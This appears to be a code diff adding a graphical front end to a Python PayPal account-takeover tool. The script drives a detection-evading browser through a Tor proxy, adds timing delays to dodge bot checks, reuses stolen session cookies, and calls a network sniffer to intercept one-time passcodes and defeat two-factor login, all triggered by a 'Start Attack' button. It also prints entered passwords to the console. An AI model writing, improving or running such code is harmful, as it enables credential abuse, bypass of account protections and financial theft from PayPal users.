@@ -15,11 +15,23 @@ import undetected_chromedriver as uc
 import scapy.all as scapy  # For network sniffing
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+import tkinter as tk
+from tkinter import ttk
+import webbrowser
 
 # ---------- CONFIGURATION ----------
 SESSION_COOKIE_FILE = "paypal_cookies.json"  # Store session cookies
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
 PROXY = "socks5://127.0.0.1:9050"  # Example proxy (Tor SOCKS5)
+
+# ---------- GUI FUNCTIONS ----------
+def update_progress(step, total_steps):
+    progress['value'] = (step / total_steps) * 100
+    window.update_idletasks()
+
+def show_message(message):
+    message_label.config(text=message)
+    window.update_idletasks()
 
 # ---------- LOAD & SAVE COOKIES ----------
 def save_cookies(driver, filename):
@@ -34,7 +46,7 @@ def load_cookies(driver, filename):
             driver.add_cookie(cookie)
         driver.refresh()
     except FileNotFoundError:
-        print("[!] No saved session found. Logging in manually.")
+        show_message("[!] No saved session found. Logging in manually.")
 
 # ---------- STEALTH FUNCTIONS ----------
 def stealth_delay():
@@ -73,7 +85,7 @@ def browser_automation_attack(email, password):
     WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_email")))
 
     if "summary" in driver.current_url:
-        print("[+] Session restored successfully!")
+        show_message("[+] Session restored successfully!")
         return driver
 
     # Enter email
@@ -87,6 +99,9 @@ def browser_automation_attack(email, password):
     next_button.click()
     stealth_delay()
 
+    update_progress(2, 6)
+    show_message("Entering Password...")
+
     # Wait for the password input field to be available
     WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login_password")))
 
@@ -99,34 +114,81 @@ def browser_automation_attack(email, password):
     # Log the entered password for debugging (This will print the password to the console for debugging purposes, remove in production)
     print(f"[DEBUG] Entered Password: {password}")
 
+    update_progress(3, 6)
+    show_message("Logging in...")
+
     # Wait for the 'Login' button to be clickable and click it
     WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "btnLogin")))
     login_button = driver.find_element(By.ID, "btnLogin")
     login_button.click()
     stealth_delay()
 
-    # Log the URL to check if we are redirected
-    print(f"[DEBUG] Current URL after login attempt: {driver.current_url}")
+    update_progress(4, 6)
+    show_message("Waiting for OTP...")
+
+    # OTP Interception
+    otp_code = sniff_otp()
+    if otp_code:
+        # Wait for the OTP input field to be available
+        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "otp")))
+        otp_input = driver.find_element(By.NAME, "otp")
+        otp_input.send_keys(otp_code)
+        otp_input.send_keys(Keys.RETURN)
+        stealth_delay()
+
+    update_progress(5, 6)
+    show_message("Finalizing...")
 
     # Check if login was successful
     if "summary" in driver.current_url:
-        print("[+] Login successful! Saving session cookies.")
+        show_message("[+] Login successful! Saving session cookies.")
         save_cookies(driver, SESSION_COOKIE_FILE)
+        update_progress(6, 6)
+        show_message("[+] Login successful! Open in Browser")
+        webbrowser.open(driver.current_url)
     else:
-        print("[-] Login failed.")
+        show_message("[-] Login failed.")
 
     return driver
 
-# ---------- START SCRIPT ----------
-def main():
-    print("PayPal Security Testing Script")
-    email = input("Enter PayPal email: ")
-    password = input("Enter PayPal password (will be visible as you type): ")  # Replacing getpass with input for better visibility
-
+# ---------- GUI SETUP ----------
+def start_attack():
+    email = email_entry.get()
+    password = password_entry.get()
+    
+    show_message("Starting automation...")
     driver = browser_automation_attack(email, password)
     if driver:
-        print("[*] Session is now active. Proceeding with automation.")
+        show_message("Session is now active. Opening PayPal in browser.")
         driver.quit()
 
-if __name__ == "__main__":
-    main()
+# ---------- GUI WINDOW ----------
+window = tk.Tk()
+window.title("PayPal Automation Tool")
+
+# Email entry
+email_label = tk.Label(window, text="Enter PayPal email:")
+email_label.pack(pady=5)
+email_entry = tk.Entry(window, width=40)
+email_entry.pack(pady=5)
+
+# Password entry
+password_label = tk.Label(window, text="Enter PayPal password:")
+password_label.pack(pady=5)
+password_entry = tk.Entry(window, width=40, show="*")
+password_entry.pack(pady=5)
+
+# Start attack button
+start_button = tk.Button(window, text="Start Attack", command=start_attack)
+start_button.pack(pady=10)
+
+# Progress bar
+progress = ttk.Progressbar(window, orient="horizontal", length=300, mode="determinate")
+progress.pack(pady=10)
+
+# Message label
+message_label = tk.Label(window, text="", fg="green")
+message_label.pack(pady=10)
+
+# Run GUI
+window.mainloop()
